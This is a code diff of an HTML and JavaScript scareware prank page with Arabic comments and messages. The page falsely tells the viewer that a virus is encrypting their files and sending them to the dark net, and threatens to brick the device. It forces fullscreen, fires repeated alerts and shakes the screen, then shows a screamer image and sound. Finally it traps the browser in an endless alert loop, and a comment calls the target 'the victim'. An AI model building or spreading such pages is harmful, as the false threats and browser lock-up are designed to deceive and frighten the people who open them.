@@ -3,82 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM CRITICAL</title>
+    <title>CRITICAL SYSTEM VIRUS</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; color: #ff0000; }
         
-        /* الصورة في الخلفية سواسوة */
-        #scaryImg { width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: -1; display: none; }
+        /* واجهة التحذير الأولى */
+        #mainContainer { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; z-index: 10; background: radial-gradient(circle, #1a0000 0%, #000 100%); }
         
-        /* طبقة العد التنازلي والرسالة الأولى (Deep Web Style) */
-        #timerContainer { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: cyan; text-align: center; background: rgba(0,0,0,0.85); z-index: 1; }
-        #countdown { font-size: 70px; color: red; font-weight: bold; margin: 20px 0; text-shadow: 0 0 10px red; }
+        .warning-icon { font-size: 80px; margin-bottom: 10px; animation: blink 0.8s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
         
-        /* طبقة الرسالة التحذيرية النهائية (مخفية في البداية) */
-        #messageContainer { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: cyan; text-align: center; background: rgba(0,0,0,0.95); z-index: 2; border: 3px solid red; box-sizing: border-box; }
-        #warningMessage { font-size: 16px; width: 80%; line-height: 1.6; }
-        .glitch { animation: glitch 0.5s infinite; }
-        @keyframes glitch { 0% { text-shadow: 1px 1px red; } 50% { text-shadow: -1px -1px blue; } 100% { text-shadow: 1px -1px yellow; } }
+        h1 { font-size: 28px; text-transform: uppercase; letter-spacing: 2px; border: 2px solid #ff0000; padding: 10px; }
+        
+        .message-box { width: 85%; margin: 20px 0; line-height: 1.5; color: #00ffff; font-size: 14px; border-left: 3px solid #00ffff; padding-left: 10px; text-align: left; }
+        .arabic-msg { direction: rtl; text-align: right; color: #ffff00; margin-top: 10px; font-weight: bold; }
+        
+        /* العد التنازلي */
+        #timer { font-size: 60px; font-weight: bold; color: #ff0000; text-shadow: 0 0 20px #ff0000; margin-top: 20px; }
+        
+        /* الصورة المرعبة (مخفية في البداية) */
+        #scaryImg { width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 100; display: none; }
+        
+        /* اللاق والاهتزاز */
+        .shake { animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(1px, 1px); } 100% { transform: translate(-1px, -1px); } }
     </style>
 </head>
-<body onclick="launchVirus()">
-    <div id="timerContainer">
-        <h1 class="glitch" style="color:red; font-size: 40px;">⚠️ WARNING: SYSTEM TERMINATION ⚠️</h1>
-        <p>Your IP has been logged by [D33P_W3B_NODES]. Destruction in:</p>
-        <div id="countdown">01:00</div>
+<body onclick="startInfection()">
+    <div id="mainContainer">
+        <div class="warning-icon">⚠️</div>
+        <h1>CRITICAL VIRUS DETECTED</h1>
         
-        <div id="initialMessage">
-            <p style="color:yellow; direction: rtl;">لقد حذرناك سابقاً. ربي يسهل عليك، حنّا مقلنالكش أدخل. <br>Your files are being uploaded to the .dark net</p>
+        <div class="message-box">
+            [SYSTEM ERROR]: UNKNOWN MALWARE IDENTIFIED. <br>
+            [STATUS]: ALL FILES ARE BEING ENCRYPTED AND SENT TO DARK NET NODES. <br>
+            [NOTICE]: DO NOT CLOSE THIS WINDOW OR YOUR DEVICE WILL BE PERMANENTLY BRICKED.
+            <div class="arabic-msg">
+                تحذير: لقد تم اختراق نظامك بنجاح. <br>
+                جميع ملفاتك وصورك الآن في طريقها إلى الدارك نت.. راحت عليك!
+            </div>
         </div>
-    </div>
-    
-    <img id="scaryImg" src="https://i.ibb.co/39snnynW/1000016067.jpg" alt="scary">
-    
-    <div id="messageContainer">
-        <h1 class="glitch" style="color:red; font-size: 40px;">⚠️ DATA PURGE COMPLETE ⚠️</h1>
-        <p>Your device is now compromised. There is no way out.</p>
-        
-        <div id="warningMessage">
-            SYSTEM FAILURE. ENCRYPTION KEYS LOST. <br>
-            ==================================== <br>
-            <p style="color:yellow; direction: rtl; font-weight: bold;">إنّنا لا نهتمّ بأمرك، ولا نتحمل أي مسؤولية تجاه أفعالك.</p>
-        </div>
+
+        <p style="color:white;">DESTRUCTION STARTS IN:</p>
+        <div id="timer">01:00</div>
     </div>
 
-    <audio id="s" loop src="https://www.soundboard.com/handler/DownloadTrack.ashx?cliptitle=Scary+Scream&filename=24/243645-77983652-326d-476b-9c71-29402513f56b.mp3"></audio>
+    <img id="scaryImg" src="https://i.ibb.co/39snnynW/1000016067.jpg" alt="SCARY">
+
+    <audio id="screamSound" src="https://www.soundboard.com/handler/DownloadTrack.ashx?cliptitle=Scary+Scream&filename=24/243645-77983652-326d-476b-9c71-29402513f56b.mp3"></audio>
 
     <script>
-        let timeLeft = 60; // 1 دقيقة
-        let hasLaunched = false;
+        let timeLeft = 60; 
+        let started = false;
 
-        function updateCountdown() {
-            let minutes = Math.floor(timeLeft / 60);
-            let seconds = timeLeft % 60;
-            document.getElementById('countdown').innerHTML = 
-                (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+        function startInfection() {
+            if (started) return;
+            started = true;
+            document.documentElement.requestFullscreen();
             
-            if (timeLeft > 0) {
+            let countdown = setInterval(() => {
                 timeLeft--;
-            } else {
-                // عند انتهاء الوقت، إظهار الصورة والرسالة النهائية
-                document.getElementById('timerContainer').style.display = 'none';
-                document.getElementById('scaryImg').style.display = 'block';
-                document.getElementById('messageContainer').style.display = 'flex';
-                alert("⚠️ SYSTEM ERROR. FILES DELETED.");
+                let mins = Math.floor(timeLeft / 60);
+                let secs = timeLeft % 60;
+                document.getElementById('timer').innerHTML = `0${mins}:${secs < 10 ? '0' : ''}${secs}`;
+                
+                if (timeLeft <= 10) {
+                    document.body.classList.add('shake'); // يبدأ الهاتف بالاهتزاز في آخر 10 ثوانٍ
+                }
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    triggerScream();
+                }
+            }, 1000);
+
+            // تفعيل اللاق الإجباري لإرعاب الضحية
+            setInterval(() => { 
+                if (timeLeft > 0) alert("⚠️ SYSTEM OVERRIDE: DATA PURGE " + (100 - timeLeft) + "%"); 
+            }, 5000);
+        }
+
+        function triggerScream() {
+            document.getElementById('mainContainer').style.display = 'none';
+            let img = document.getElementById('scaryImg');
+            img.style.display = 'block';
+            document.getElementById('screamSound').play();
+            
+            // قمة الرعب: تنبيهات لا تنتهي بعد ظهور الصورة
+            while(true) {
+                alert("إنّنا لا نهتمّ بأمرك.. وداعاً لبياناتك!");
             }
         }
-
-        function launchVirus() {
-            if (hasLaunched) return;
-            hasLaunched = true;
-            document.documentElement.requestFullscreen();
-            document.getElementById('s').play();
-            setInterval(updateCountdown, 1000);
-            
-            // اللاق الإجباري (بسيف باش يخرج)
-            setInterval(() => { alert("⚠️ خطأ في المعالج! الملفات تالفة!"); }, 40);
-        }
-        window.onload = launchVirus;
     </script>
 </body>
 </html>
